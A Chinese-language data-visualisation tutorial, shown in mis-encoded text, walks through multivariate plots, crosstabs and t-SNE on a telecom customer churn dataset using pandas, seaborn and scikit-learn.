æ¡å½¢å›¾å’Œç›´æ–¹å›¾çš„åŒºåˆ«å¦‚ä¸‹ï¼š ç›´æ–¹å›¾é€‚åˆæŸ¥çœ‹æ•°å€¼å˜é‡çš„åˆ†å¸ƒï¼Œè€Œæ¡å½¢å›¾ç”¨äºæŸ¥çœ‹ç±»åˆ«ç‰¹å¾ã€‚ ç›´æ–¹å›¾çš„ X è½´æ˜¯æ•°å€¼ï¼›æ¡å½¢å›¾çš„ X è½´å¯èƒ½æ˜¯ä»»ä½•ç±»å‹ï¼Œå¦‚æ•°å­—ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ã€‚ ç›´æ–¹å›¾çš„ X è½´æ˜¯ä¸€ä¸ªç¬›å¡å°”åæ ‡è½´ï¼›æ¡å½¢å›¾çš„é¡ºåºåˆ™æ²¡æœ‰äº‹å…ˆå®šä¹‰ã€‚ ä¸Šå·¦å›¾æ¸…æ™°åœ°è¡¨æ˜äº†ç›®æ ‡å˜é‡çš„å¤±è¡¡æ€§ã€‚ä¸Šå³å›¾åˆ™è¡¨æ˜å¤§éƒ¨åˆ†å®¢æˆ·æœ€å¤šæ‰“äº† 2-3 ä¸ªå®¢æœç”µè¯å°±è§£å†³äº†ä»–ä»¬çš„é—®é¢˜ã€‚ä¸è¿‡ï¼Œæ—¢ç„¶æƒ³è¦é¢„æµ‹å°‘æ•°æ•°æ®çš„åˆ†ç±»ï¼ˆChurn==1ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½å¯¹å°‘æ•°ä¸æ»¡æ„çš„å®¢æˆ·çš„è¡¨ç°æ›´æ„Ÿå…´è¶£ã€‚æ‰€ä»¥è®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹æ›´æœ‰è¶£çš„å¯è§†åŒ–æ–¹æ³•ï¼šå¤šå˜é‡å¯è§†åŒ–ï¼Œçœ‹èƒ½å¦å¯¹é¢„æµ‹æœ‰æ‰€å¸®åŠ©ã€‚ å¤šå˜é‡å¯è§†åŒ– å¤šå˜é‡ï¼ˆmultivariateï¼‰å›¾å½¢å¯ä»¥åœ¨å•å¼ å›¾åƒä¸­æŸ¥çœ‹ä¸¤ä¸ªä»¥ä¸Šå˜é‡çš„è”ç³»ï¼Œå’Œå•å˜é‡å›¾å½¢ä¸€æ ·ï¼Œå¯è§†åŒ–çš„ç±»å‹å–å†³äºå°†è¦åˆ†æçš„å˜é‡çš„ç±»å‹ã€‚ å…ˆæ¥çœ‹çœ‹æ•°é‡å˜é‡ä¹‹é—´çš„ç›¸äº’ä½œç”¨ã€‚ ç›¸å…³çŸ©é˜µ ç›¸å…³çŸ©é˜µå¯æ­ç¤ºæ•°æ®é›†ä¸­çš„æ•°å€¼å˜é‡çš„ç›¸å…³æ€§ã€‚è¿™ä¸€ä¿¡æ¯å¾ˆé‡è¦ï¼Œå› ä¸ºæœ‰ä¸€äº›æœºå™¨å­¦ä¹ ç®—æ³•ï¼ˆæ¯”å¦‚ï¼Œçº¿æ€§å›å½’å’Œé€»è¾‘å›å½’ï¼‰ä¸èƒ½å¾ˆå¥½åœ°å¤„ç†é«˜åº¦ç›¸å…³çš„è¾“å…¥å˜é‡ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨ DataFrame çš„ corr() æ–¹æ³•è®¡ç®—å‡ºæ¯å¯¹ç‰¹å¾é—´çš„ç›¸å…³æ€§ã€‚æ¥ç€ï¼Œæˆ‘ä»¬å°†æ‰€å¾—çš„ç›¸å…³çŸ©é˜µï¼ˆcorrelation matrixï¼‰ä¼ ç»™ seaborn çš„ heatmap()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ ¹æ®æä¾›çš„æ•°å€¼ï¼Œæ¸²æŸ“å‡ºä¸€ä¸ªåŸºäºè‰²å½©ç¼–ç çš„çŸ©é˜µã€‚ 1234567# ä¸¢å¼ƒéæ•°å€¼å˜é‡numerical = list(set(df.columns) - set([&#x27;State&#x27;, &#x27;International plan&#x27;, &#x27;Voice mail plan&#x27;, &#x27;Area code&#x27;, &#x27;Churn&#x27;, &#x27;Customer service calls&#x27;]))# è®¡ç®—å’Œç»˜å›¾corr_matrix = df[numerical].corr()sns.heatmap(corr_matrix) ä¸Šå›¾ä¸­ï¼ŒTotal day charge æ—¥è¯è´¹æ€»é¢ æ˜¯ç›´æ¥åŸºäº Total day minutes ç”µè¯çš„åˆ†é’Ÿæ•° è®¡ç®—å¾—åˆ°ï¼Œå®ƒè¢«ç§°ä¸ºå› å˜é‡ã€‚é™¤äº† Total day charge å¤–ï¼Œè¿˜æœ‰ 3 ä¸ªå› å˜é‡ï¼šTotal eve chargeï¼ŒTotal night chargeï¼ŒTotal intl chargeã€‚è¿™ 4 ä¸ªå› å˜é‡å¹¶ä¸è´¡çŒ®ä»»ä½•é¢å¤–ä¿¡æ¯ï¼Œæˆ‘ä»¬ç›´æ¥å»é™¤ã€‚ 12numerical = list(set(numerical) - set([&#x27;Total day charge&#x27;, &#x27;Total eve charge&#x27;, &#x27;Total night charge&#x27;, &#x27;Total intl charge&#x27;])) æ•£ç‚¹å›¾ æ•£ç‚¹å›¾ï¼ˆscatter plotï¼‰å°†ä¸¤ä¸ªæ•°å€¼å˜é‡çš„å€¼æ˜¾ç¤ºä¸ºäºŒç»´ç©ºé—´ä¸­çš„ç¬›å¡å°”åæ ‡ï¼ˆCartesian coordinateï¼‰ã€‚é€šè¿‡ matplotlib åº“çš„ scatter() æ–¹æ³•å¯ä»¥ç»˜åˆ¶æ•£ç‚¹å›¾ã€‚ 1plt.scatter(df[&#x27;Total day minutes&#x27;], df[&#x27;Total night minutes&#x27;]) æˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªæ­£æ€åˆ†å¸ƒå˜é‡çš„æ•£ç‚¹å›¾ï¼Œçœ‹èµ·æ¥è¿™ä¸¤ä¸ªå˜é‡å¹¶ä¸ç›¸å…³ï¼Œå› ä¸ºä¸Šå›¾çš„å½¢çŠ¶å’Œè½´æ˜¯å¯¹é½çš„ã€‚ seaborn åº“çš„ jointplot() æ–¹æ³•åœ¨ç»˜åˆ¶æ•£ç‚¹å›¾çš„åŒæ—¶ä¼šç»˜åˆ¶ä¸¤å¼ ç›´æ–¹å›¾ï¼ŒæŸäº›æƒ…å½¢ä¸‹å®ƒä»¬å¯èƒ½ä¼šæ›´æœ‰ç”¨ã€‚ 12sns.jointplot(x=&#x27;Total day minutes&#x27;, y=&#x27;Total night minutes&#x27;, data=df, kind=&#x27;scatter&#x27;) jointplot() æ–¹æ³•è¿˜å¯ä»¥ç»˜åˆ¶å¹³æ»‘è¿‡çš„æ•£ç‚¹ç›´æ–¹å›¾ã€‚ 12sns.jointplot(&#x27;Total day minutes&#x27;, &#x27;Total night minutes&#x27;, data=df, kind=&quot;kde&quot;, color=&quot;g&quot;) ä¸Šå›¾åŸºæœ¬ä¸Šå°±æ˜¯ä¹‹å‰è®¨è®ºè¿‡çš„æ ¸å¯†åº¦å›¾çš„åŒå˜é‡ç‰ˆæœ¬ã€‚ æ•£ç‚¹å›¾çŸ©é˜µ åœ¨æŸäº›æƒ…å½¢ä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³è¦ç»˜åˆ¶å¦‚ä¸‹æ‰€ç¤ºçš„æ•£ç‚¹å›¾çŸ©é˜µï¼ˆscatterplot matrixï¼‰ã€‚å®ƒçš„å¯¹è§’çº¿åŒ…å«å˜é‡çš„åˆ†å¸ƒï¼Œå¹¶ä¸”æ¯å¯¹å˜é‡çš„æ•£ç‚¹å›¾å¡«å……äº†çŸ©é˜µçš„å…¶ä½™éƒ¨åˆ†ã€‚ 12%config InlineBackend.figure_format = &#x27;png&#x27;sns.pairplot(df[numerical]) æ•°é‡å’Œç±»åˆ« ä¸ºäº†è®©å›¾å½¢æ›´æœ‰è¶£ä¸€ç‚¹ï¼Œå¯ä»¥å°è¯•ä»æ•°å€¼å’Œç±»åˆ«ç‰¹å¾çš„ç›¸äº’ä½œç”¨ä¸­å¾—åˆ°é¢„æµ‹ Churn çš„æ–°ä¿¡æ¯ï¼Œæ›´å…·ä½“åœ°ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹è¾“å…¥å˜é‡å’Œç›®æ ‡å˜é‡ Churn çš„å…³ç³»ã€‚ä½¿ç”¨ lmplot() æ–¹æ³•çš„ hue å‚æ•°æ¥æŒ‡å®šæ„Ÿå…´è¶£çš„ç±»åˆ«ç‰¹å¾ã€‚ 12sns.lmplot(&#x27;Total day minutes&#x27;, &#x27;Total night minutes&#x27;, data=df, hue=&#x27;Churn&#x27;, fit_reg=False) çœ‹èµ·æ¥ä¸å¿ å®å®¢æˆ·åå‘å³ä¸Šè§’ï¼Œä¹Ÿå°±æ˜¯å€¾å‘äºåœ¨ç™½å¤©å’Œå¤œé—´æ‰“æ›´å¤šç”µè¯çš„å®¢æˆ·ã€‚å½“ç„¶ï¼Œè¿™ä¸æ˜¯éå¸¸æ˜æ˜¾ï¼Œæˆ‘ä»¬ä¹Ÿä¸ä¼šåŸºäºè¿™ä¸€å›¾å½¢ä¸‹ä»»ä½•ç¡®å®šæ€§çš„ç»“è®ºã€‚ ç°åœ¨ï¼Œåˆ›å»ºç®±å½¢å›¾ï¼Œä»¥å¯è§†åŒ–å¿ å®å®¢æˆ·ï¼ˆChurn=0ï¼‰å’Œç¦»ç½‘å®¢æˆ·ï¼ˆChurn=1ï¼‰è¿™ä¸¤ä¸ªäº’æ–¥åˆ†ç»„ä¸­æ•°å€¼å˜é‡åˆ†å¸ƒçš„ç»Ÿè®¡æ•°æ®ã€‚ 12345678910# æœ‰æ—¶æˆ‘ä»¬å¯ä»¥å°†æœ‰åºå˜é‡ä½œä¸ºæ•°å€¼å˜é‡åˆ†ænumerical.append(&#x27;Customer service calls&#x27;)fig, axes = plt.subplots(nrows=3, ncols=4, figsize=(10, 7))for idx, feat in enumerate(numerical): ax = axes[int(idx / 4), idx % 4] sns.boxplot(x=&#x27;Churn&#x27;, y=feat, data=df, ax=ax) ax.set_xlabel(&#x27;&#x27;) ax.set_ylabel(feat)fig.tight_layout() ä¸Šé¢çš„å›¾è¡¨è¡¨æ˜ï¼Œä¸¤ç»„ä¹‹é—´åˆ†æ­§æœ€å¤§çš„åˆ†å¸ƒæ˜¯è¿™ä¸‰ä¸ªå˜é‡ï¼šTotal day minutes æ—¥é€šè¯åˆ†é’Ÿæ•°ã€Customer service calls å®¢æœå‘¼å«æ•°ã€Number vmail messages è¯­éŸ³é‚®ä»¶æ•°ã€‚åœ¨åç»­çš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•ä½¿ç”¨éšæœºæ£®æ—ï¼ˆRandom Forestï¼‰æˆ–æ¢¯åº¦æå‡ï¼ˆGradient Boostingï¼‰æ¥åˆ¤å®šç‰¹å¾å¯¹åˆ†ç±»çš„é‡è¦æ€§ï¼Œå±Šæ—¶å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°ï¼Œå‰ä¸¤ä¸ªç‰¹å¾å¯¹äºç¦»ç½‘é¢„æµ‹æ¨¡å‹è€Œè¨€ç¡®å®éå¸¸é‡è¦ã€‚ åˆ›å»ºç®±å‹å›¾å’Œæç´å½¢å›¾ï¼ŒæŸ¥çœ‹å¿ å®å®¢æˆ·å’Œä¸å¿ å®å®¢æˆ·çš„æ—¥é€šè¯åˆ†é’Ÿæ•°ã€‚ 1234_, axes = plt.subplots(1, 2, sharey=True, figsize=(10, 4))sns.boxplot(x=&#x27;Churn&#x27;, y=&#x27;Total day minutes&#x27;, data=df, ax=axes[0])sns.violinplot(x=&#x27;Churn&#x27;, y=&#x27;Total day minutes&#x27;, data=df, ax=axes[1]) ä¸Šå›¾è¡¨æ˜ï¼Œä¸å¿ å®å®¢æˆ·å€¾å‘äºæ‰“æ›´å¤šçš„ç”µè¯ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥å‘ç°ä¸€ä¸ªæœ‰è¶£çš„ä¿¡æ¯ï¼šå¹³å‡è€Œè¨€ï¼Œç¦»ç½‘å®¢æˆ·æ˜¯é€šè®¯æœåŠ¡æ›´æ´»è·ƒçš„ç”¨æˆ·ã€‚æˆ–è®¸æ˜¯ä»–ä»¬å¯¹è¯è´¹ä¸æ»¡æ„ï¼Œæ‰€ä»¥é¢„é˜²ç¦»ç½‘çš„ä¸€ä¸ªå¯èƒ½æªæ–½æ˜¯é™ä½é€šè¯è´¹ã€‚å½“ç„¶ï¼Œå…¬å¸éœ€è¦è¿›è¡Œé¢å¤–çš„ç»æµåˆ†æï¼Œä»¥æŸ¥æ˜è¿™æ ·åšæ˜¯å¦çœŸçš„æœ‰åˆ©ã€‚ å½“æƒ³è¦ä¸€æ¬¡æ€§åˆ†æä¸¤ä¸ªç±»åˆ«ç»´åº¦ä¸‹çš„æ•°é‡å˜é‡æ—¶ï¼Œå¯ä»¥ç”¨ seaborn åº“çš„ catplot() å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œåœ¨åŒä¸€å›¾å½¢ä¸­å¯è§†åŒ– Total day minutes æ—¥é€šè¯åˆ†é’Ÿæ•° å’Œä¸¤ä¸ªç±»åˆ«å˜é‡ï¼ˆChurn å’Œ Customer service callsï¼‰çš„ç›¸äº’ä½œç”¨ã€‚ 123sns.catplot(x=&#x27;Churn&#x27;, y=&#x27;Total day minutes&#x27;, col=&#x27;Customer service calls&#x27;, data=df[df[&#x27;Customer service calls&#x27;] &lt; 8], kind=&quot;box&quot;, col_wrap=4, height=3, aspect=.8) ä¸Šå›¾è¡¨æ˜ï¼Œä»ç¬¬ 4 æ¬¡å®¢æœå‘¼å«å¼€å§‹ï¼ŒTotal day minutes æ—¥é€šè¯åˆ†é’Ÿæ•° å¯èƒ½ä¸å†æ˜¯å®¢æˆ·ç¦»ç½‘ï¼ˆChurn==1ï¼‰çš„ä¸»è¦å› ç´ ã€‚ä¹Ÿè®¸ï¼Œé™¤äº†æˆ‘ä»¬ä¹‹å‰çŒœæµ‹çš„è¯è´¹åŸå› ï¼Œè¿˜æœ‰å…¶ä»–é—®é¢˜å¯¼è‡´å®¢æˆ·å¯¹æœåŠ¡ä¸æ»¡æ„ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ—¥é€šè¯åˆ†é’Ÿæ•°æ›´å°‘ã€‚ ç±»åˆ«ä¸ç±»åˆ« æ­£å¦‚ä¹‹å‰æåˆ°çš„ï¼Œå˜é‡ Customer service calls å®¢æœå‘¼å«æ•° çš„é‡å¤å€¼å¾ˆå¤šï¼Œå› æ­¤ï¼Œæ—¢å¯ä»¥çœ‹æˆæ•°å€¼å˜é‡ï¼Œä¹Ÿå¯ä»¥çœ‹æˆæœ‰åºç±»åˆ«å˜é‡ã€‚ä¹‹å‰å·²é€šè¿‡è®¡æ•°å›¾ï¼ˆcount plotï¼‰æŸ¥çœ‹è¿‡å®ƒçš„åˆ†å¸ƒäº†ï¼Œç°åœ¨æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ˜¯è¿™ä¸€æœ‰åºç‰¹å¾å’Œç›®æ ‡å˜é‡ Churn ç¦»ç½‘ç‡ ä¹‹é—´çš„å…³ç³»ã€‚ ä½¿ç”¨ countplot() æ–¹æ³•æŸ¥çœ‹å®¢æœå‘¼å«æ•°çš„åˆ†å¸ƒï¼Œè¿™æ¬¡ä¼ å…¥ hue=Churn å‚æ•°ï¼Œä»¥ä¾¿åœ¨å›¾å½¢ä¸­åŠ å…¥ç±»åˆ«ç»´åº¦ã€‚ 1sns.countplot(x=&#x27;Customer service calls&#x27;, hue=&#x27;Churn&#x27;, data=df) ä¸Šå›¾è¡¨æ˜ï¼Œå‘¼å«å®¢æœè¾¾åˆ° 4 æ¬¡ä»¥ä¸Šåï¼Œç¦»ç½‘ç‡æ˜¾è‘—å¢åŠ äº†ã€‚ ä½¿ç”¨ countplot() æ–¹æ³•æŸ¥çœ‹ Churn ç¦»ç½‘ç‡ å’ŒäºŒå…ƒç‰¹å¾ International plan å›½é™…å¥—é¤ã€Voice mail plan è¯­éŸ³é‚®ä»¶å¥—é¤ çš„å…³ç³»ã€‚ 1234_, axes = plt.subplots(1, 2, sharey=True, figsize=(10, 4))sns.countplot(x=&#x27;International plan&#x27;, hue=&#x27;Churn&#x27;, data=df, ax=axes[0])sns.countplot(x=&#x27;Voice mail plan&#x27;, hue=&#x27;Churn&#x27;, data=df, ax=axes[1]) ä¸Šå›¾è¡¨æ˜ï¼Œå¼€é€šå›½é™…å¥—é¤åï¼Œç¦»ç½‘ç‡ä¼šé«˜å¾ˆå¤šï¼Œå³ International plan æ˜¯å¦å¼€é€šå›½é™…å¥—é¤ æ˜¯ä¸€ä¸ªé‡è¦çš„ç‰¹å¾ã€‚æˆ‘ä»¬åœ¨ Vocie mail plan è¯­éŸ³é‚®ä»¶å¥—é¤ ç‰¹å¾ä¸Šæ²¡æœ‰è§‚å¯Ÿåˆ°ç±»ä¼¼çš„æ•ˆæœã€‚ äº¤å‰è¡¨ é™¤äº†ä½¿ç”¨å›¾å½¢è¿›è¡Œç±»åˆ«åˆ†æä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç»Ÿè®¡å­¦çš„ä¼ ç»Ÿå·¥å…·ï¼šäº¤å‰è¡¨ï¼ˆcross tabulationï¼‰ï¼Œå³ä½¿ç”¨è¡¨æ ¼å½¢å¼è¡¨ç¤ºå¤šä¸ªç±»åˆ«å˜é‡çš„é¢‘ç‡åˆ†å¸ƒã€‚é€šè¿‡å®ƒå¯ä»¥æŸ¥çœ‹æŸä¸€åˆ—æˆ–æŸä¸€è¡Œä»¥äº†è§£æŸä¸ªå˜é‡åœ¨å¦ä¸€å˜é‡çš„ä½œç”¨ä¸‹çš„åˆ†å¸ƒæƒ…å†µã€‚ é€šè¿‡äº¤å‰è¡¨æŸ¥çœ‹ Churn ç¦»ç½‘ç‡ å’Œç±»åˆ«å˜é‡ State å· çš„å…³ç³»ã€‚ 1pd.crosstab(df[&#x27;State&#x27;], df[&#x27;Churn&#x27;]).T ä¸Šè¡¨æ˜¾ç¤ºï¼ŒState å· æœ‰ 51 ä¸ªä¸åŒçš„å€¼ï¼Œå¹¶ä¸”æ¯ä¸ªå·åªæœ‰ 3 åˆ° 17 ä¸ªå®¢æˆ·æŠ›å¼ƒäº†è¿è¥å•†ã€‚é€šè¿‡ groupby() æ–¹æ³•è®¡ç®—æ¯ä¸ªå·çš„ç¦»ç½‘ç‡ï¼Œç”±é«˜åˆ°ä½æ’åˆ—ã€‚ 12df.groupby([&#x27;State&#x27;])[&#x27;Churn&#x27;].agg( [np.mean]).sort_values(by=&#x27;mean&#x27;, ascending=False).T ä¸Šè¡¨æ˜¾ç¤ºï¼Œæ–°æ³½è¥¿å’ŒåŠ åˆ©ç¦å°¼äºšçš„ç¦»ç½‘ç‡è¶…è¿‡äº† 25%ï¼Œå¤å¨å¤·å’Œé˜¿æ‹‰æ–¯åŠ çš„ç¦»ç½‘ç‡åˆ™ä¸åˆ° 6%ã€‚ç„¶è€Œï¼Œè¿™äº›ç»“è®ºæ˜¯åŸºäºæå°‘çš„æ ·æœ¬å¾—å‡ºçš„ï¼Œå¯èƒ½ä»…é€‚ç”¨äºè¿™ä¸€ç‰¹å®šæ•°æ®é›†ï¼Œä¸å¤ªå…·æœ‰æ³›ç”¨æ€§ã€‚ å…¨å±€æ•°æ®é›†å¯è§†åŒ– ä¸Šé¢æˆ‘ä»¬ä¸€ç›´åœ¨ç ”ç©¶æ•°æ®é›†çš„ä¸åŒæ–¹é¢ï¼ˆfacetï¼‰ï¼Œé€šè¿‡çŒœæµ‹æœ‰è¶£çš„ç‰¹å¾å¹¶ä¸€æ¬¡é€‰æ‹©å°‘é‡ç‰¹å¾è¿›è¡Œå¯è§†åŒ–ã€‚å¦‚æœæˆ‘ä»¬æƒ³ä¸€æ¬¡æ€§æ˜¾ç¤ºæ‰€æœ‰ç‰¹å¾å¹¶ä»ç„¶èƒ½å¤Ÿè§£é‡Šç”Ÿæˆçš„å¯è§†åŒ–ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ é™ç»´ å¤§å¤šæ•°ç°å®ä¸–ç•Œçš„æ•°æ®é›†æœ‰å¾ˆå¤šç‰¹å¾ï¼Œæ¯ä¸€ä¸ªç‰¹å¾éƒ½å¯ä»¥è¢«çœ‹æˆæ•°æ®ç©ºé—´çš„ä¸€ä¸ªç»´åº¦ã€‚å› æ­¤ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å¤„ç†é«˜ç»´æ•°æ®é›†ï¼Œç„¶è€Œå¯è§†åŒ–æ•´ä¸ªé«˜ç»´æ•°æ®é›†ç›¸å½“éš¾ã€‚ä¸ºäº†ä»æ•´ä½“ä¸ŠæŸ¥çœ‹ä¸€ä¸ªæ•°æ®é›†ï¼Œéœ€è¦åœ¨ä¸æŸå¤±å¾ˆå¤šæ•°æ®ä¿¡æ¯çš„å‰æä¸‹ï¼Œé™ä½ç”¨äºå¯è§†åŒ–çš„ç»´åº¦ã€‚è¿™ä¸€ä»»åŠ¡è¢«ç§°ä¸ºé™ç»´ï¼ˆdimensionality reductionï¼‰ã€‚é™ç»´æ˜¯ä¸€ä¸ªæ— ç›‘ç£å­¦ä¹ ï¼ˆunsupervised learningï¼‰é—®é¢˜ï¼Œå› ä¸ºå®ƒéœ€è¦åœ¨ä¸å€ŸåŠ©ä»»ä½•ç›‘ç£è¾“å…¥ï¼ˆå¦‚æ ‡ç­¾ï¼‰çš„å‰æä¸‹ï¼Œä»æ•°æ®è‡ªèº«å¾—åˆ°æ–°çš„ä½ç»´ç‰¹å¾ã€‚ ä¸»æˆåˆ†åˆ†æï¼ˆPrincipal Component Analysis, PCAï¼‰æ˜¯ä¸€ä¸ªè‘—åçš„é™ç»´æ–¹æ³•ï¼Œæˆ‘ä»¬ä¼šåœ¨ä¹‹åçš„è¯¾ç¨‹ä¸­è®¨è®ºå®ƒã€‚ä½†ä¸»æˆåˆ†åˆ†æçš„å±€é™æ€§åœ¨äºï¼Œå®ƒæ˜¯çº¿æ€§ï¼ˆlinearï¼‰ç®—æ³•ï¼Œè¿™æ„å‘³ç€å¯¹æ•°æ®æœ‰æŸäº›ç‰¹å®šçš„é™åˆ¶ã€‚ ä¸çº¿æ€§æ–¹æ³•ç›¸å¯¹çš„ï¼Œæœ‰è®¸å¤šéçº¿æ€§æ–¹æ³•ï¼Œç»Ÿç§°æµå½¢å­¦ä¹ ï¼ˆManifold Learningï¼‰ã€‚è‘—åçš„æµå½¢å­¦ä¹ æ–¹æ³•ä¹‹ä¸€æ˜¯ t-SNEã€‚ t-SNE å®ƒçš„åŸºæœ¬æ€è·¯å¾ˆç®€å•ï¼šä¸ºé«˜ç»´ç‰¹å¾ç©ºé—´åœ¨äºŒç»´å¹³é¢ï¼ˆæˆ–ä¸‰ç»´å¹³é¢ï¼‰ä¸Šå¯»æ‰¾ä¸€ä¸ªæŠ•å½±ï¼Œä½¿å¾—åœ¨åŸæœ¬çš„ n ç»´ç©ºé—´ä¸­ç›¸è·å¾ˆè¿œçš„æ•°æ®ç‚¹åœ¨äºŒç»´å¹³é¢ä¸ŠåŒæ ·ç›¸è·è¾ƒè¿œï¼Œè€ŒåŸæœ¬ç›¸è¿‘çš„ç‚¹åœ¨å¹³é¢ä¸Šä»ç„¶ç›¸è¿‘ã€‚ è¯¥æ•°æ®åº“åˆ›å»ºä¸€ä¸ª t-SNE è¡¨ç¤ºï¼Œé¦–å…ˆåŠ è½½ä¾èµ–ã€‚ 12from sklearn.manifold import TSNEfrom sklearn.preprocessing import StandardScaler å»é™¤ State å· å’Œ Churn ç¦»ç½‘ç‡ å˜é‡ï¼Œç„¶åç”¨ pandas.Series.map() æ–¹æ³•å°†äºŒå…ƒç‰¹å¾çš„ã€ŒYesã€/ã€ŒNoã€è½¬æ¢æˆæ•°å€¼ã€‚ : 123X = df.drop([&#x27;Churn&#x27;, &#x27;State&#x27;], axis=1)X[&#x27;International plan&#x27;] = X[&#x27;International plan&#x27;].map(&#123;&#x27;Yes&#x27;: 1, &#x27;No&#x27;: 0&#125;)X[&#x27;Voice mail plan&#x27;] = X[&#x27;Voice mail plan&#x27;].map(&#123;&#x27;Yes&#x27;: 1, &#x27;No&#x27;: 0&#125;) ä½¿ç”¨ StandardScaler() æ–¹æ³•æ¥å®Œæˆå½’ä¸€åŒ–æ•°æ®ï¼Œå³ä»æ¯ä¸ªå˜é‡ä¸­å‡å»å‡å€¼ï¼Œç„¶åé™¤ä»¥æ ‡å‡†å·®ã€‚ 12scaler = StandardScaler()X_scaled = scaler.fit_transform(X) ç°åœ¨å¯ä»¥æ„å»º t-SNE è¡¨ç¤ºäº†ã€‚ 12tsne = TSNE(random_state=17)tsne_repr = tsne.fit_transform(X_scaled) ç„¶åä»¥å›¾å½¢çš„æ–¹å¼å¯è§†åŒ–ã€‚ 1plt.scatter(tsne_repr[:, 0], tsne_repr[:, 1], alpha=.5) æ ¹æ®ç¦»ç½‘æƒ…å†µç»™ t-SNE è¡¨ç¤ºåŠ ä¸Šè‰²å½©ï¼ˆè“è‰²è¡¨ç¤ºå¿ å®ç”¨æˆ·ï¼Œé»„è‰²è¡¨ç¤ºä¸å¿ å®ç”¨æˆ·ï¼‰ï¼Œå½¢æˆç¦»ç½‘æƒ…å†µæ•£ç‚¹å›¾ã€‚ 12plt.scatter(tsne_repr[:, 0], tsne_repr[:, 1], c=df[&#x27;Churn&#x27;].map(&#123;False: &#x27;blue&#x27;, True: &#x27;orange&#x27;&#125;), alpha=.5) å¯ä»¥çœ‹åˆ°ï¼Œç¦»ç½‘å®¢æˆ·é›†ä¸­åœ¨ä½ç»´ç‰¹å¾ç©ºé—´çš„ä¸€å°éƒ¨åˆ†åŒºåŸŸã€‚ä¸ºäº†æ›´å¥½åœ°ç†è§£è¿™ä¸€å›¾åƒï¼Œå¯ä»¥ä½¿ç”¨å‰©ä¸‹çš„ä¸¤ä¸ªäºŒå…ƒç‰¹å¾ï¼Œå³ International plan å›½é™…å¥—é¤ å’Œ Voice mail plan è¯­éŸ³é‚®ä»¶å¥—é¤ ç»™å›¾åƒç€è‰²ï¼Œè“è‰²ä»£è¡¨äºŒå…ƒç‰¹å¾çš„å€¼ä¸º Yesï¼Œé»„è‰²ä»£è¡¨äºŒå…ƒç‰¹å¾çš„å€¼ä¸º Noã€‚ 123456_, axes = plt.subplots(1, 2, sharey=True, figsize=(12, 5))for i, name in enumerate([&#x27;International plan&#x27;, &#x27;Voice mail plan&#x27;]): axes[i].scatter(tsne_repr[:, 0], tsne_repr[:, 1], c=df[name].map(&#123;&#x27;Yes&#x27;: &#x27;orange&#x27;, &#x27;No&#x27;: &#x27;blue&#x27;&#125;), alpha=.5) axes[i].set_title(name) é€šè¿‡ä¸Šé¢ 3 å¼ å›¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´ç›´è§‚çš„åˆ†æå®¢æˆ·çš„ç¦»ç½‘åŸå› äº†ã€‚ æœ€åï¼Œäº†è§£ä¸‹ t-SNE çš„ç¼ºé™·ã€‚ è®¡ç®—å¤æ‚åº¦é«˜ã€‚å¦‚æœä½ æœ‰å¤§é‡æ ·æœ¬ï¼Œä½ åº”è¯¥ä½¿ç”¨ Multicore-TSNEã€‚ éšæœºæ•°ç§å­çš„ä¸åŒä¼šå¯¼è‡´å›¾å½¢å¤§ä¸ç›¸åŒï¼Œè¿™ç»™è§£é‡Šå¸¦æ¥äº†å›°éš¾ã€‚é€šå¸¸è€Œè¨€ï¼Œä½ ä¸åº”è¯¥åŸºäºè¿™äº›å›¾åƒåšå‡ºä»»ä½•å†³å®šæ€§çš„ç»“è®ºï¼Œå› ä¸ºå®ƒå¯èƒ½å’Œå•çº¯çš„çŒœæµ‹å·®ä¸å¤šã€‚å½“ç„¶ï¼Œt-SNE å›¾åƒä¸­çš„æŸäº›å‘ç°å¯èƒ½ä¼šå¯å‘ä¸€ä¸ªæƒ³æ³•ï¼Œè¿™ä¸ªæƒ³æ³•å¯ä»¥é€šè¿‡æ›´å…¨é¢æ·±å…¥çš„ç ”ç©¶å¾—åˆ°ç¡®è®¤ã€‚ å®éªŒæ€»ç»“ æœ¬ç« èŠ‚é¦–å…ˆä»‹ç»äº† Pandasã€Matplotlib å’Œ seaborn åº“çš„ä¸€äº›å¸¸ç”¨å¯è§†åŒ–æ–¹æ³•ï¼Œå¹¶å¯¹å®¢æˆ·ç¦»ç½‘æ•°æ®é›†è¿›è¡Œäº†å¯è§†åŒ–åˆ†æå’Œ t-SNE é™ç»´ã€‚å¯è§†åŒ–æ˜¯ä¸€ä¸ªç›¸å¯¹å¿«æ·çš„ä»æ•°æ®ä¸­æŒ–æ˜ä¿¡æ¯çš„æ‰‹æ®µï¼Œå› æ­¤ï¼Œå­¦ä¹ è¿™ä¸€æŠ€æœ¯å¹¶å°†å…¶çº³å…¥ä½ çš„æ—¥å¸¸æœºå™¨å­¦ä¹ å·¥å…·ç®±ï¼Œæ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚ ç›¸å…³é“¾æ¥ æœ¬æ–‡æ‰€ç”¨åº“çš„å®˜æ–¹æ–‡æ¡£ï¼š Matplotlib, seaborn å’Œ Pandas. ä½¿ç”¨ seaborn ç»˜å›¾çš„ç¤ºä¾‹ Galleryã€‚ scikit-learn çš„æµå½¢å­¦ä¹ æ–‡æ¡£ Documentationã€‚ é«˜æ•ˆçš„ t-SNE å®ç° Multicore-TSNEã€‚ å¦‚ä½•æœ‰æ•ˆä½¿ç”¨ t-SNE Distill.pubã€‚ äº†è§£è“æ¡¥äº‘è¯¾ã€Šæ¥¼+ æœºå™¨å­¦ä¹ 